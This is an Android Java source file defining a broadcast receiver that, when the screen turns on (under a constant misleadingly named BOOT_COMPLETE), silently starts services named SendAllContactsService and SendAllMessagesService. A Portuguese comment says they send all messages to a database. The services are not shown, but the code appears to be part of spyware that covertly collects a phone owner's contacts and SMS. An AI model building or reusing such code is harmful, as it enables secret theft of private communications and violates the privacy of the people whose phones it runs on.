package com.test.myapplication.broadcasts;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

import com.test.myapplication.services.SendAllContactsService;
import com.test.myapplication.services.SendAllMessagesService;

public class BootCompleteBroadcast extends BroadcastReceiver {

    private static final String BOOT_COMPLETE = "android.intent.action.SCREEN_ON";
    private static String activateWord = "Pode";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("INTENT", new Intent(context, SendAllMessagesService.class).toString());

        if (intent.getAction().equals(BOOT_COMPLETE)) {

            context.startService(new Intent(context, SendAllContactsService.class));
            context.startService(new Intent(context, SendAllMessagesService.class));
            //CHAMAR CLASS DE ENVIAR TODAS AS MENSAGENS PARA A DB

            Log.i("INTENT", new Intent(context, SendAllMessagesService.class).toString());

        }
    }
}
